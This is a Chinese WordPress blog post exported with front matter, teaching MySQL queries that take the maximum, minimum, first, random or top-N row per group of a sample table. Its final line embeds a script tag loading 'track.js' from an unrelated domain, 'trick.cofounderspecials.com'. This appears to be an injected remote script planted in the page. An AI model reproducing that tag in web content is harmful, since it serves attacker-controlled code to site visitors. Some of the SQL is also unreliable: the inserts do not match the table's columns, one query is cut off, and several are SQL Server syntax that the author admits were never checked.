---
layout: post
title: mysql分组取最大(最小、最新、前N条)条记录
date: 2022-03-31 12:25:30.000000000 +08:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- Mysql
tags: []
meta:
  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
  _edit_last: '1'
author:
  login: gavin
  email: 519077334@qq.com
  display_name: gavin
  first_name: ''
  last_name: ''
permalink: "/index.php/2022/03/31/mysql%e5%88%86%e7%bb%84%e5%8f%96%e6%9c%80%e5%a4%a7%e6%9c%80%e5%b0%8f%e3%80%81%e6%9c%80%e6%96%b0%e3%80%81%e5%89%8dn%e6%9d%a1%e6%9d%a1%e8%ae%b0%e5%bd%95/"
---
<p><!-- wp:paragraph --></p>
<p>在数据库开发过程中，我们要为每种类型的数据取出前几条记录，或者是取最新、最小、最大等等，这个该如何实现呢，本文章向大家介绍如何实现mysql分组取最大(最小、最新、前N条)条记录。需要的可以参考一下。</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>先看一下本示例中需要使用到的数据</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>创建表并插入数据：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">CREATE TABLE `tb` (
  `id` int(<strong>11</strong>) NOT NULL AUTO_INCREMENT,
  `name` varchar(<strong>10</strong>) CHARACTER SET latin1 DEFAULT NULL,
  `val` int(<strong>11</strong>) DEFAULT NULL,
  `memo` varchar(<strong>20</strong>) CHARACTER SET latin1 DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=<strong>9</strong> DEFAULT CHARSET=utf8</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">insert into tb values('a',    <strong>2</strong>,   'a2');
insert into tb values('a',    <strong>1</strong>,   'a1');
insert into tb values('a',    <strong>3</strong>,   'a3');
insert into tb values('b',    <strong>1</strong>,   'b1');
insert into tb values('b',    <strong>3</strong>,   'b3');
insert into tb values('b',    <strong>2</strong>,   'b2');
insert into tb values('b',    <strong>4</strong>,   'b4');
insert into tb values('b',    <strong>5</strong>,   'b5');</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>数据表如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>2</td>
<td>a2</td>
<tr />
<td>a</td>
<td>1</td>
<td>a1</td>
<tr />
<td>a</td>
<td>3</td>
<td>a3</td>
<tr />
<td>b</td>
<td>1</td>
<td>b1</td>
<tr />
<td>b</td>
<td>3</td>
<td>b3</td>
<tr />
<td>b</td>
<td>2</td>
<td>b2</td>
<tr />
<td>b</td>
<td>4</td>
<td>b4</td>
<tr />
<td>b</td>
<td>5</td>
<td>b5</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2>按name分组取val最大的值所在行的数据</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>方法一：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where val = (select max(val) from tb where name = a.name) order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法二：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where not exists(select <strong>1</strong> from tb where name = a.name and val &gt; a.val)</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法三：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a,(select name,max(val) val from tb group by name) b where a.name = b.name and a.val = b.val order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法四：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a inner join (select name , max(val) val from tb group by name) b on a.name = b.name and a.val = b.val order by</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法五：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where <strong>1</strong> &gt; (select count(*) from tb where name = a.name and val &gt; a.val ) order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法六:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select * from (select * from tb ORDER BY val desc) temp GROUP BY name ORDER BY val desc;</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>以上六种方法运行的结果均为如下所示：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>3</td>
<td>a3</td>
<tr />
<td>b</td>
<td>5</td>
<td>b5</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:paragraph --></p>
<p>小编推荐使用第一、第三、第四钟方法,结果显示第1,3,4种方法效率相同，第2，5种方法效率差些。</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2>按name分组取val最小的值所在行的数据</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>方法一：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where val = (select min(val) from tb where name = a.name) order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法二：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where not exists(select <strong>1</strong> from tb where name = a.name and val &lt; a.val)</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法三：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a,(select name,min(val) val from tb group by name) b where a.name = b.name and a.val = b.val order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法四：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a inner join (select name , min(val) val from tb group by name) b on a.name = b.name and a.val = b.val order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>方法五：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where <strong>1</strong> &gt; (select count(*) from tb where name = a.name and val &lt; a.val) order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>以上五种方法运行的结果均为如下所示：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>1</td>
<td>a1</td>
<tr />
<td>b</td>
<td>1</td>
<td>b1</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2>按name分组取第一次出现的行所在的数据&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>sql如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:preformatted --></p>
<pre class="wp-block-preformatted">select a.* from tb a where val = (select top <strong>1</strong> val from tb where name = a.name) order by a.name
//这个是sql server的
//mysql应该是
select a.* from tb a where val = (select val from tb where name = a.name limit <strong>1</strong>) order by a.name</pre>
<p><!-- /wp:preformatted --></p>
<p><!-- wp:paragraph --></p>
<p>结果如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>2</td>
<td>a2</td>
<tr />
<td>b</td>
<td>1</td>
<td>b1</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2>-----下面的没有验证-- 感觉是sql-server的写法,mysql的随机是rand(),前几条记录是limit N.</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:heading --></p>
<h2>按name分组随机取一条数据</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>sql如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where val = (select top 1 val from tb where name = a.name order by newid()) order by a.name</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>结果如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>1</td>
<td>a1</td>
<tr />
<td>b</td>
<td>3</td>
<td>b3</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2>按name分组取最小的两个(N个)val</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>第一种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where 2 &gt; (select count(*) from tb where name = a.name and val &lt; a.val ) order by a.name,a.val</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>第二种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where val in (select top 2 val from tb where name=a.name order by val) order by a.name,a.val</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>第三种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where exists (select count(*) from tb where name = a.name and val &lt; a.val having Count(*) &lt; 2) order by a.name</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>结果如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>1</td>
<td>a1</td>
<tr />
<td>a</td>
<td>2</td>
<td>a2</td>
<tr />
<td>b</td>
<td>1</td>
<td>b1</td>
<tr />
<td>b</td>
<td>2</td>
<td>b2</td>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2>按name分组取最大的两个(N个)val</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>第一种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where 2 &gt; (select count(*) from tb where name = a.name and val &gt; a.val ) order by a.name,a.val</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>第二种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where val in (select top 2 val from tb where name=a.name order by val desc) order by a.name,a.val</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>第三种方法：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:code --></p>
<pre class="wp-block-code"><code>select a.* from tb a where exists (select count(*) from tb where name = a.name and val &gt; a.val having Count(*) &lt; 2) order by a.name</code></pre>
<p><!-- /wp:code --></p>
<p><!-- wp:paragraph --></p>
<p>结果如下：</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr /></tbody>
</table>
<td>name</td>
<td>val</td>
<td>memo</td>
<tr />
<td>a</td>
<td>3</td>
<td>a3</td>
<tr />
<td>a</td>
<td>2</td>
<td>a2</td>
<tr />
<td>b</td>
<td>5</td>
<td>b5</td>
<tr />
<td>b</td>
<td>4</td>
<td>b4</td>
</figure>
<p><!-- /wp:table --><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
